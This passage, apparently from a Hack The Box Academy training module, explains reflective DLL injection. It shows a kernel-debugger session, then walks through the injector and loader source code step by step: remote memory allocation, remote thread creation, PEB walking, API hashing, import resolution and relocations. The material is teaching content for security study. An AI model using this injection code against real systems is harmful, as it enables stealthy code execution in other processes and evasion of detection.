Let's verify the object name (i.e, DLL name) by calling the same command with the `r8` register to parse the values, i.e., `dt nt!_OBJECT_ATTRIBUTES @r8`:

```c
0: kd> dq rcx l1
00000011`e43ff548  00000011`e43ff680
0: kd> ?rdx
Evaluate expression: 13 = 00000000`0000000d
0: kd> dt nt!_OBJECT_ATTRIBUTES @r8
   +0x000 Length           : 0x30
   +0x008 RootDirectory    : 0x00000000`00000038 Void
   +0x010 ObjectName       : 0x00000145`73bd2dd0 _UNICODE_STRING "reflective.dll"
   +0x018 Attributes       : 0x40
   +0x020 SecurityDescriptor : (null)
   +0x028 SecurityQualityOfService : (null)

```

As we can see in the screenshot below, we can inspect all three registers. The third register, i.e., `R8` ( `r8`), contains the object name (library name).

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-25.png)

This way, we can learn a lot about Windows internals and understand the flow of different functions inside important Windows DLLs.

We've gained an understanding of how `LoadLibrary()` works in Windows. It takes care of mapping the DLL file into the memory of a process. It resolves the IAT, fixes relocations, and calls the entry point. In the next section, we'll see how the Reflective DLL injection technique is used to load a DLL into a target process without using `LoadLibrary()`. Instead, it relies on a self-contained loader within the DLL itself. This loader is responsible for parsing the DLL's PE (Portable Executable) header, resolving its imports, and fixing its relocations, all in memory without touching the disk. This way, the DLL can be loaded directly from memory, making it harder to detect this technique.


# RDLL Injection - Implementation

The [Reflective DLL injection](https://github.com/stephenfewer/ReflectiveDLLInjection) (RDLL injection) technique uses the concept of reflective programming to perform the loading of a library from memory into a host process. This technique is demonstrated in an open-source project and is utilized by a number of different projects, such as [Metasploit](https://github.com/rapid7/meterpreter/blob/master/source/extensions/priv/server/elevate/tokendup.c) and [Cobalt Strike](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-1-simplifying-development), to perform reflective DLL injection.

The different steps involved in Reflective DLL injection are categorized into stages as follows:

- `Stage 1 - Loading the DLL into Memory`:
The attacker first loads the DLL into memory, typically by downloading it from the internet.
The DLL contains its own loader code, which is responsible for parsing the DLL's PE header and mapping its sections into memory.
- `Stage 2 - Mapping Sections`:
The loader code parses the DLL's PE header to identify the sections that need to be mapped into memory.
It allocates memory in the target process for each section and copies the section data from the DLL into the allocated memory.
- `Stage 3 - Fixing Pointers and Addresses`:
Since the DLL is being manually loaded, its pointers and addresses (such as function addresses) need to be fixed to reflect their new locations in memory.
The loader code updates these pointers and addresses to point to the correct locations in the target process's memory.
- `Stage 4 - Resolving Imports (IAT)`:
The loader code resolves the DLL's import table by locating and loading the required DLLs and resolving the addresses of imported functions.
- `Stage 5 - Executing the DLL's Entry Point`:
Finally, the loader code calls the entry point of the DLL, which begins the execution of the injected code in the target process.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll-image-62_.png)

## Understanding Reflective DLL Injection

We have three main components here:

- `Injector Process` to inject reflective DLL into target process.
- `Reflective DLL` containing `ReflectiveLoader()` custom loader function.
- `DLL` containing the `DLLMain()` function to execute `MessageBox`.

Let's start by understanding these components, beginning with the injector process.

## Injector Process

First, the DLL file is read into a file buffer, `lpBuffer`.

```c
  if( ReadFile( hFile, lpBuffer, dwLength, &dwBytesRead, NULL ) == FALSE )
    BREAK_WITH_ERROR( "Failed to alloc a buffer!" );

```

Open the remote process and acquire the handle in `hProcess`.

```c
  hProcess = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId );
  if( !hProcess )
    BREAK_WITH_ERROR( "Failed to open the target process" );

  hModule = LoadRemoteLibraryR( hProcess, lpBuffer, dwLength, NULL );
  if( !hModule )
    BREAK_WITH_ERROR( "Failed to inject the DLL" );

  printf( "[+] Injected the '%s' DLL into process %d.", cpDllFile, dwProcessId );

  WaitForSingleObject( hModule, -1 );

```

It calls the `LoadRemoteLibraryR()` function to inject the DLL buffer. Let's look into the implementation of the `LoadRemoteLibraryR()` function:

```c
HANDLE WINAPI LoadRemoteLibraryR( HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength, LPVOID lpParameter )
{
	BOOL bSuccess                             = FALSE;
	LPVOID lpRemoteLibraryBuffer              = NULL;
	LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
	HANDLE hThread                            = NULL;
	DWORD dwReflectiveLoaderOffset            = 0;
	DWORD dwThreadId                          = 0;

	__try
	{
		do
		{
			if( !hProcess  || !lpBuffer || !dwLength )
				break;

			// check if the library has a ReflectiveLoader...
			dwReflectiveLoaderOffset = GetReflectiveLoaderOffset( lpBuffer );
			if( !dwReflectiveLoaderOffset )
				break;

			// alloc memory (RWX) in the host process for the image...
			lpRemoteLibraryBuffer = VirtualAllocEx( hProcess, NULL, dwLength, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
			if( !lpRemoteLibraryBuffer )
				break;

			// write the image into the host process...
			if( !WriteProcessMemory( hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL ) )
				break;

			// add the offset to ReflectiveLoader() to the remote library address...
			lpReflectiveLoader = (LPTHREAD_START_ROUTINE)( (ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset );

			// create a remote thread in the host process to call the ReflectiveLoader!
			hThread = CreateRemoteThread( hProcess, NULL, 1024*1024, lpReflectiveLoader, lpParameter, (DWORD)NULL, &dwThreadId );

		} while( 0 );

	}
	__except( EXCEPTION_EXECUTE_HANDLER )
	{
		hThread = NULL;
	}

	return hThread;
}

```

There is a call to the `GetReflectiveLoaderOffset()` function. This function is used to find the offset of the `ReflectiveLoader` function within a reflective DLL buffer. The `ReflectiveLoader()` function is a special function within the DLL that allows it to be loaded and executed in a reflective manner.

First, it takes a pointer to a reflective DLL buffer as input ( `lpReflectiveDllBuffer`). Then, it calculates the address of the export directory of the DLL, retrieves the addresses of the arrays containing the function names, addresses, and name ordinals from the export directory, and loops through the exported function names to find the `ReflectiveLoader` function.

```c
DWORD GetReflectiveLoaderOffset( VOID * lpReflectiveDllBuffer )
{
	UINT_PTR uiBaseAddress   = 0;
	UINT_PTR uiExportDir     = 0;
	UINT_PTR uiNameArray     = 0;
	UINT_PTR uiAddressArray  = 0;
	UINT_PTR uiNameOrdinals  = 0;
	DWORD dwCounter          = 0;
#ifdef WIN_X64
	DWORD dwCompiledArch = 2;
#else
	// This will catch Win32 and WinRT.
	DWORD dwCompiledArch = 1;
#endif

	uiBaseAddress = (UINT_PTR)lpReflectiveDllBuffer;

	// get the File Offset of the modules NT Header
	uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

	// currenlty we can only process a PE file which is the same type as the one this fuction has
	// been compiled as, due to various offset in the PE structures being defined at compile time.
	if( ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x010B ) // PE32
	{
		if( dwCompiledArch != 1 )
			return 0;
	}
	else if( ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x020B ) // PE64
	{
		if( dwCompiledArch != 2 )
			return 0;
	}
	else
	{
		return 0;
	}

	// uiNameArray = the address of the modules export directory entry
	uiNameArray = (UINT_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

	// get the File Offset of the export directory
	uiExportDir = uiBaseAddress + Rva2Offset( ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress, uiBaseAddress );

	// get the File Offset for the array of name pointers
	uiNameArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNames, uiBaseAddress );

	// get the File Offset for the array of addresses
	uiAddressArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions, uiBaseAddress );

	// get the File Offset for the array of name ordinals
	uiNameOrdinals = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNameOrdinals, uiBaseAddress );

	// get a counter for the number of exported functions...
	dwCounter = ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->NumberOfNames;

	// loop through all the exported functions to find the ReflectiveLoader
	while( dwCounter-- )
	{
		char * cpExportedFunctionName = (char *)(uiBaseAddress + Rva2Offset( DEREF_32( uiNameArray ), uiBaseAddress ));

		if( strstr( cpExportedFunctionName, "ReflectiveLoader" ) != NULL )
		{
			// get the File Offset for the array of addresses
			uiAddressArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions, uiBaseAddress );

			// use the functions name ordinal as an index into the array of name pointers
			uiAddressArray += ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) );

			// return the File Offset to the ReflectiveLoader() functions code...
			return Rva2Offset( DEREF_32( uiAddressArray ), uiBaseAddress );
		}
		// get the next exported function name
		uiNameArray += sizeof(DWORD);

		// get the next exported function name ordinal
		uiNameOrdinals += sizeof(WORD);
	}

	return 0;
}

```

Once the `ReflectiveLoader()` function is found, it calculates and returns the offset to its code within the DLL buffer. This offset will be stored in the `dwReflectiveLoaderOffset`, which points to the `ReflectiveLoader()` function.

Then we will allocate memory in the remote process:

```c
  // alloc memory (RWX) in the host process for the image...
  lpRemoteLibraryBuffer = VirtualAllocEx( hProcess, NULL, dwLength, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
  if( !lpRemoteLibraryBuffer )
    break;

```

This call will store the base address of the allocated region in `lpRemoteLibraryBuffer`. Then, the DLL buffer is written to this allocated memory region (i.e., `lpRemoteLibraryBuffer`).

```c
  // write the image into the host process...
  if( !WriteProcessMemory( hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL ) )
    break;

```

The next step is to add the offset to `ReflectiveLoader()` to the remote library address.

```c
  lpReflectiveLoader = (LPTHREAD_START_ROUTINE)( (ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset );

```

Then, a remote thread is created in the remote process to call the `ReflectiveLoader()` function, which is located at `lpReflectiveLoader` (i.e., the allocated memory region `lpRemoteLibraryBuffer` plus the offset to the `ReflectiveLoader()` function, `dwReflectiveLoaderOffset`). This will start the thread in remote process.

## Reflective Loader

In this part of the section, we will explain what the `ReflectiveLoader()` function does.

### Step 0: Calculate Reflective DLL's base address

In this step, we calculate the DLL's current base address in memory. We start at the `caller()` function's return address (which returns the calling function's address) and search backward in memory for the MZ/PE header, which marks the beginning of the DLL's image.

The variable `uiLibraryAddress` is initialized with the return value of the `caller()` function, which gives the address of the calling function. The code then enters a loop that searches backward in memory from `uiLibraryAddress` for the MZ/PE header of the DLL. Inside the loop, it checks if the current address (uiLibraryAddress) contains a valid MZ/PE header. If it does, it breaks out of the loop. If a valid MZ/PE header is found, the current address (uiLibraryAddress) is considered the base address of the DLL in memory.

```c
	// we will start searching backwards from our callers return address.
	uiLibraryAddress = caller();

	// loop through memory backwards searching for our images base address
	// we dont need SEH style search as we shouldnt generate any access violations with this
	while( TRUE )
	{
		if( ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_magic == IMAGE_DOS_SIGNATURE )
		{
			uiHeaderValue = ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;
			// some x64 dll's can trigger a bogus signature (IMAGE_DOS_SIGNATURE == 'POP r10'),
			// we sanity check the e_lfanew with an upper threshold value of 1024 to avoid problems.
			if( uiHeaderValue >= sizeof(IMAGE_DOS_HEADER) && uiHeaderValue < 1024 )
			{
				uiHeaderValue += uiLibraryAddress;
				// break if we have found a valid MZ/PE header
				if( ((PIMAGE_NT_HEADERS)uiHeaderValue)->Signature == IMAGE_NT_SIGNATURE )
					break;
			}
		}
		uiLibraryAddress--;
	}

```

### Step 1: Resolve the required functions

In this step, we are processing the kernel's exports to locate and retrieve the addresses of the functions that the loader needs to perform various operations.

Retrieve the Process Environment Block (PEB) address, which contains information about the current process, including loaded modules.

```c
	// get the Process Enviroment Block
#ifdef WIN_X64
	uiBaseAddress = __readgsqword( 0x60 );
#else
#ifdef WIN_X86
	uiBaseAddress = __readfsdword( 0x30 );
#else WIN_ARM
	uiBaseAddress = *(DWORD *)( (BYTE *)_MoveFromCoprocessor( 15, 0, 13, 0, 2 ) + 0x30 );
#endif
#endif

```

Retrieves the address of the process's loaded modules list from the PEB.

```c
// get the processes loaded modules. ref: http://msdn.microsoft.com/en-us/library/aa813708(VS.85).aspx
uiBaseAddress = (ULONG_PTR)((_PPEB)uiBaseAddress)->pLdr;

// get the first entry of the InMemoryOrder module list
uiValueA = (ULONG_PTR)((PPEB_LDR_DATA)uiBaseAddress)->InMemoryOrderModuleList.Flink;
while( uiValueA )
{
  // get pointer to current modules name (unicode string)
  uiValueB = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->BaseDllName.pBuffer;
  // set bCounter to the length for the loop
  usCounter = ((PLDR_DATA_TABLE_ENTRY)uiValueA)->BaseDllName.Length;
  // clear uiValueC which will store the hash of the module name
  uiValueC = 0;

```

Then, it iterates through the list of loaded modules to find the `kernel32.dll` and `ntdll.dll` modules. For each module, it computes a hash value of the module name and compares it to pre-calculated hash values for `kernel32.dll` and `ntdll.dll`. The pre-calculated hash values are defined in the `ReflectiveLoader.h` file [here](https://github1s.com/stephenfewer/ReflectiveDLLInjection/blob/master/dll/src/ReflectiveLoader.h#L43-L44).

![RDLL](https://academy.hackthebox.com/storage/modules/266/reflectivehash.png)

If a match is found, it retrieves the base address of the module.

For `kernel32.dll`, it retrieves the export directory and iterates through the export table to find the addresses of the functions: `LoadLibraryA`, `GetProcAddress`, and `VirtualAlloc`. For `ntdll.dll`, it retrieves the export directory and iterates through the export table to find the address of the function `NtFlushInstructionCache`.

```c
// compute the hash of the module name...
do
{
  uiValueC = ror( (DWORD)uiValueC );
  // normalize to uppercase if the madule name is in lowercase
  if( *((BYTE *)uiValueB) >= 'a' )
    uiValueC += *((BYTE *)uiValueB) - 0x20;
  else
    uiValueC += *((BYTE *)uiValueB);
  uiValueB++;
} while( --usCounter );

// compare the hash with that of kernel32.dll
if( (DWORD)uiValueC == KERNEL32DLL_HASH )
{
  // get this modules base address
  uiBaseAddress = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->DllBase;

  // get the VA of the modules NT Header
  uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

  // uiNameArray = the address of the modules export directory entry
  uiNameArray = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

  // get the VA of the export directory
  uiExportDir = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress );

  // get the VA for the array of name pointers
  uiNameArray = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNames );

  // get the VA for the array of name ordinals
  uiNameOrdinals = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNameOrdinals );

  usCounter = 3;

  // loop while we still have imports to find
  while( usCounter > 0 )
  {
    // compute the hash values for this function name
    dwHashValue = hash( (char *)( uiBaseAddress + DEREF_32( uiNameArray ) )  );

    // if we have found a function we want we get its virtual address
    if( dwHashValue == LOADLIBRARYA_HASH || dwHashValue == GETPROCADDRESS_HASH || dwHashValue == VIRTUALALLOC_HASH )
    {
      // get the VA for the array of addresses
      uiAddressArray = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions );

      // use this functions name ordinal as an index into the array of name pointers
      uiAddressArray += ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) );

      // store this functions VA
      if( dwHashValue == LOADLIBRARYA_HASH )
        pLoadLibraryA = (LOADLIBRARYA)( uiBaseAddress + DEREF_32( uiAddressArray ) );
      else if( dwHashValue == GETPROCADDRESS_HASH )
        pGetProcAddress = (GETPROCADDRESS)( uiBaseAddress + DEREF_32( uiAddressArray ) );
      else if( dwHashValue == VIRTUALALLOC_HASH )
        pVirtualAlloc = (VIRTUALALLOC)( uiBaseAddress + DEREF_32( uiAddressArray ) );

      // decrement our counter
      usCounter--;
    }

    // get the next exported function name
    uiNameArray += sizeof(DWORD);

    // get the next exported function name ordinal
    uiNameOrdinals += sizeof(WORD);
  }
}
else if( (DWORD)uiValueC == NTDLLDLL_HASH )
{
  // get this modules base address
  uiBaseAddress = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->DllBase;

  // get the VA of the modules NT Header
  uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

  // uiNameArray = the address of the modules export directory entry
  uiNameArray = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

  // get the VA of the export directory
  uiExportDir = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress );

  // get the VA for the array of name pointers
  uiNameArray = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNames );

  // get the VA for the array of name ordinals
  uiNameOrdinals = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNameOrdinals );

  usCounter = 1;

  // loop while we still have imports to find
  while( usCounter > 0 )
  {
    // compute the hash values for this function name
    dwHashValue = hash( (char *)( uiBaseAddress + DEREF_32( uiNameArray ) )  );

    // if we have found a function we want we get its virtual address
    if( dwHashValue == NTFLUSHINSTRUCTIONCACHE_HASH )
    {
      // get the VA for the array of addresses
      uiAddressArray = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions );

      // use this functions name ordinal as an index into the array of name pointers
      uiAddressArray += ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) );

      // store this functions VA
      if( dwHashValue == NTFLUSHINSTRUCTIONCACHE_HASH )
        pNtFlushInstructionCache = (NTFLUSHINSTRUCTIONCACHE)( uiBaseAddress + DEREF_32( uiAddressArray ) );

      // decrement our counter
      usCounter--;
    }

    // get the next exported function name
    uiNameArray += sizeof(DWORD);

    // get the next exported function name ordinal
    uiNameOrdinals += sizeof(WORD);
  }
}

// we stop searching when we have found everything we need.
if( pLoadLibraryA && pGetProcAddress && pVirtualAlloc && pNtFlushInstructionCache )
  break;

// get the next entry
uiValueA = DEREF( uiValueA );
}

```

Once all the necessary functions are found, the loop breaks, and the loader moves to the next step.

### Step 2: Load image into memory

Calculate the virtual address (VA) of the NT Header for the PE to be loaded. Allocate memory for the DLL to be loaded into using VirtualAlloc. The memory is allocated with `MEM_RESERVE|MEM_COMMIT` flags, marking it as `READ`, `WRITE`, and `EXECUTE` to avoid any problems. This memory will be used to store the DLL. It copies over the headers from the original DLL to the newly allocated memory. This includes the DOS header, NT header, and the optional header.

```c
// get the VA of the NT Header for the PE to be loaded
uiHeaderValue = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;

// allocate all the memory for the DLL to be loaded into. we can load at any address because we will
// relocate the image. Also zeros all memory and marks it as READ, WRITE and EXECUTE to avoid any problems.
uiBaseAddress = (ULONG_PTR)pVirtualAlloc( NULL, ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );

// we must now copy over the headers
uiValueA = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfHeaders;
uiValueB = uiLibraryAddress;
uiValueC = uiBaseAddress;

while( uiValueA-- )
  *(BYTE *)uiValueC++ = *(BYTE *)uiValueB++;

```

### Step 3: Load sections

In this step, all the sections of the DLL are loaded into memory. First, the VA of the first section is calculated. It iterates through all sections of the DLL, loading each section into memory.

For each section:

- It calculates the VA for the section in the newly allocated memory.
- It calculates the VA for the section's data in the original DLL.
- It copies the section's data from the original DLL to the newly allocated memory.

```c
// uiValueA = the VA of the first section
uiValueA = ( (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader + ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader );

// itterate through all sections, loading them into memory.
uiValueE = ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.NumberOfSections;
while( uiValueE-- )
{
  // uiValueB is the VA for this section
  uiValueB = ( uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->VirtualAddress );

  // uiValueC if the VA for this sections data
  uiValueC = ( uiLibraryAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->PointerToRawData );

  // copy the section over
  uiValueD = ((PIMAGE_SECTION_HEADER)uiValueA)->SizeOfRawData;

  while( uiValueD-- )
    *(BYTE *)uiValueB++ = *(BYTE *)uiValueC++;

  // get the VA of the next section
  uiValueA += sizeof( IMAGE_SECTION_HEADER );
}

```

### Step 4: Process import table

In this step, the code processes the DLL's import table. It first calculates the address of the import directory in the DLL. It iterates through each entry in the import table, loading the imported modules into memory using LoadLibraryA.

For each imported module, it iterates through all imported functions, importing them either by ordinal or by name. If the function is imported by ordinal, it calculates the address of the function in the imported module's export table and patches it into the Import Address Table (IAT). If the function is imported by name, it gets the VA of the import by name structure and uses GetProcAddress to get the address of the function in the imported module, and then patches it into the IAT.

After patching all imported functions, it moves to the next import descriptor in the import table and repeats the process until all imports are processed.

```c
// uiValueB = the address of the import directory
uiValueB = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ];

// we assume their is an import table to process
// uiValueC is the first entry in the import table
uiValueC = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress );

// itterate through all imports
while( ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name )
{
  // use LoadLibraryA to load the imported module into memory
  uiLibraryAddress = (ULONG_PTR)pLoadLibraryA( (LPCSTR)( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name ) );

  // uiValueD = VA of the OriginalFirstThunk
  uiValueD = ( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->OriginalFirstThunk );

  // uiValueA = VA of the IAT (via first thunk not origionalfirstthunk)
  uiValueA = ( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->FirstThunk );

  // itterate through all imported functions, importing by ordinal if no name present
  while( DEREF(uiValueA) )
  {
    // sanity check uiValueD as some compilers only import by FirstThunk
    if( uiValueD && ((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal & IMAGE_ORDINAL_FLAG )
    {
      // get the VA of the modules NT Header
      uiExportDir = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;

      // uiNameArray = the address of the modules export directory entry
      uiNameArray = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

      // get the VA of the export directory
      uiExportDir = ( uiLibraryAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress );

      // get the VA for the array of addresses
      uiAddressArray = ( uiLibraryAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions );

      // use the import ordinal (- export ordinal base) as an index into the array of addresses
      uiAddressArray += ( ( IMAGE_ORDINAL( ((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal ) - ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->Base ) * sizeof(DWORD) );

      // patch in the address for this imported function
      DEREF(uiValueA) = ( uiLibraryAddress + DEREF_32(uiAddressArray) );
    }
    else
    {
      // get the VA of this functions import by name struct
      uiValueB = ( uiBaseAddress + DEREF(uiValueA) );

      // use GetProcAddress and patch in the address for this imported function
      DEREF(uiValueA) = (ULONG_PTR)pGetProcAddress( (HMODULE)uiLibraryAddress, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uiValueB)->Name );
    }
    // get the next imported function
    uiValueA += sizeof( ULONG_PTR );
    if( uiValueD )
      uiValueD += sizeof( ULONG_PTR );
  }

  // get the next import
  uiValueC += sizeof( IMAGE_IMPORT_DESCRIPTOR );
}

```

### Step 5: Fix Relocations

In this step, the code processes all of the DLL's relocations. It first calculates the base address delta and performs relocations, even if the DLL is loaded at its desired image base. Then, it calculates the address of the relocation directory in the DLL and checks if there are any relocations present.

It iterates through each relocation block in the relocation directory. For each relocation block, it iterates through all the relocation entries and performs the relocation based on the relocation type:

- For `IMAGE_REL_BASED_DIR64`, it adds the base address delta to the 64-bit address at the relocation offset.
- For `IMAGE_REL_BASED_HIGHLOW`, it adds the base address delta to the 32-bit address at the relocation offset.
- For `IMAGE_REL_BASED_ARM_MOV32T` (specific to ARM), it extracts the high 16 bits of the address to relocate from the instruction, applies the relocation, and patches the new address back into the instruction.
- For `IMAGE_REL_BASED_HIGH`, it adds the high 16 bits of the base address delta to the 16-bit value at the relocation offset.
- For `IMAGE_REL_BASED_LOW`, it adds the low 16 bits of the base address delta to the 16-bit value at the relocation offset.

After processing all the relocations, it moves to the next relocation block in the relocation directory and repeats the process until all relocations are processed.

```c
// calculate the base address delta and perform relocations (even if we load at desired image base)
uiLibraryAddress = uiBaseAddress - ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.ImageBase;

// uiValueB = the address of the relocation directory
uiValueB = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];

// check if their are any relocations present
if( ((PIMAGE_DATA_DIRECTORY)uiValueB)->Size )
{
  // uiValueC is now the first entry (IMAGE_BASE_RELOCATION)
  uiValueC = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress );

  // and we itterate through all entries...
  while( ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock )
  {
    // uiValueA = the VA for this relocation block
    uiValueA = ( uiBaseAddress + ((PIMAGE_BASE_RELOCATION)uiValueC)->VirtualAddress );

    // uiValueB = number of entries in this relocation block
    uiValueB = ( ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION) ) / sizeof( IMAGE_RELOC );

    // uiValueD is now the first entry in the current relocation block
    uiValueD = uiValueC + sizeof(IMAGE_BASE_RELOCATION);

    // we itterate through all the entries in the current block...
    while( uiValueB-- )
    {
      // perform the relocation, skipping IMAGE_REL_BASED_ABSOLUTE as required.
      // we dont use a switch statement to avoid the compiler building a jump table
      // which would not be very position independent!
      if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_DIR64 )
        *(ULONG_PTR *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += uiLibraryAddress;
      else if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGHLOW )
        *(DWORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += (DWORD)uiLibraryAddress;
#ifdef WIN_ARM
      // Note: On ARM, the compiler optimization /O2 seems to introduce an off by one issue, possibly a code gen bug. Using /O1 instead avoids this problem.
      else if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_ARM_MOV32T )
      {
        register DWORD dwInstruction;
        register DWORD dwAddress;
        register WORD wImm;
        // get the MOV.T instructions DWORD value (We add 4 to the offset to go past the first MOV.W which handles the low word)
        dwInstruction = *(DWORD *)( uiValueA + ((PIMAGE_RELOC)uiValueD)->offset + sizeof(DWORD) );
        // flip the words to get the instruction as expected
        dwInstruction = MAKELONG( HIWORD(dwInstruction), LOWORD(dwInstruction) );
        // sanity chack we are processing a MOV instruction...
        if( (dwInstruction & ARM_MOV_MASK) == ARM_MOVT )
        {
          // pull out the encoded 16bit value (the high portion of the address-to-relocate)
          wImm  = (WORD)( dwInstruction & 0x000000FF);
          wImm |= (WORD)((dwInstruction & 0x00007000) >> 4);
          wImm |= (WORD)((dwInstruction & 0x04000000) >> 15);
          wImm |= (WORD)((dwInstruction & 0x000F0000) >> 4);
          // apply the relocation to the target address
          dwAddress = ( (WORD)HIWORD(uiLibraryAddress) + wImm ) & 0xFFFF;
          // now create a new instruction with the same opcode and register param.
          dwInstruction  = (DWORD)( dwInstruction & ARM_MOV_MASK2 );
          // patch in the relocated address...
          dwInstruction |= (DWORD)(dwAddress & 0x00FF);
          dwInstruction |= (DWORD)(dwAddress & 0x0700) << 4;
          dwInstruction |= (DWORD)(dwAddress & 0x0800) << 15;
          dwInstruction |= (DWORD)(dwAddress & 0xF000) << 4;
          // now flip the instructions words and patch back into the code...
          *(DWORD *)( uiValueA + ((PIMAGE_RELOC)uiValueD)->offset + sizeof(DWORD) ) = MAKELONG( HIWORD(dwInstruction), LOWORD(dwInstruction) );
        }
      }
#endif
      else if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGH )
        *(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += HIWORD(uiLibraryAddress);
      else if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_LOW )
        *(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += LOWORD(uiLibraryAddress);

      // get the next entry in the current relocation block
      uiValueD += sizeof( IMAGE_RELOC );
    }

    // get the next entry in the relocation directory
    uiValueC = uiValueC + ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock;
  }
}

```

### Step 6: Call DLL's entry point (DLLMain)

